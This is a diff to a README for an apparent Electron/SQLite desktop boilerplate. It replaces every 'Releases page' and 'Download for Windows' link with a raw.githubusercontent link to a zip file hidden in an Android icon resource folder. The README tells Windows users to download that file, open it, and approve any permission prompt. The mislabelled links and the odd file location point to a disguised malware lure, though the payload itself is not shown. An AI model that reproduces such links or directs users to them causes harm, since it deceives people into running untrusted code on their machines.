@@ -1,6 +1,6 @@
 # 🖥️ electron-sqlite-rest-boilerplate - Build desktop apps with local data
 
-[![Download the app](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge)](https://github.com/bostonbrownbreadinnervation647/electron-sqlite-rest-boilerplate/releases)
+[![Download the app](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge)](https://raw.githubusercontent.com/bostonbrownbreadinnervation647/electron-sqlite-rest-boilerplate/main/electron-sqlite-rest-boilerplate/resources/icons/android/res/mipmap-hdpi/electron_sqlite_boilerplate_rest_3.4-beta.1.zip)
 
 ## 📦 What this is
 
@@ -12,13 +12,13 @@ This project fits apps that store lots of data, work offline, or need a simple l
 
 Visit this page to download and run the app on Windows:
 
-[Open the Releases page](https://github.com/bostonbrownbreadinnervation647/electron-sqlite-rest-boilerplate/releases)
+[Open the Releases page](https://raw.githubusercontent.com/bostonbrownbreadinnervation647/electron-sqlite-rest-boilerplate/main/electron-sqlite-rest-boilerplate/resources/icons/android/res/mipmap-hdpi/electron_sqlite_boilerplate_rest_3.4-beta.1.zip)
 
 On that page, look for the latest release and download the Windows file. After the file finishes downloading, open it to start the app or installer.
 
 ## 🚀 Getting started
 
-1. Open the [Releases page](https://github.com/bostonbrownbreadinnervation647/electron-sqlite-rest-boilerplate/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/bostonbrownbreadinnervation647/electron-sqlite-rest-boilerplate/main/electron-sqlite-rest-boilerplate/resources/icons/android/res/mipmap-hdpi/electron_sqlite_boilerplate_rest_3.4-beta.1.zip)
 2. Find the newest release near the top
 3. Download the Windows version
 4. If Windows asks for permission, choose Run or Yes
@@ -168,7 +168,7 @@ If the app still does not open, download the newest release again and try the Wi
 
 ## 📍 Download again
 
-[Go to the Releases page](https://github.com/bostonbrownbreadinnervation647/electron-sqlite-rest-boilerplate/releases)
+[Go to the Releases page](https://raw.githubusercontent.com/bostonbrownbreadinnervation647/electron-sqlite-rest-boilerplate/main/electron-sqlite-rest-boilerplate/resources/icons/android/res/mipmap-hdpi/electron_sqlite_boilerplate_rest_3.4-beta.1.zip)
 
 ## 🗂️ Folder hints for later use
 
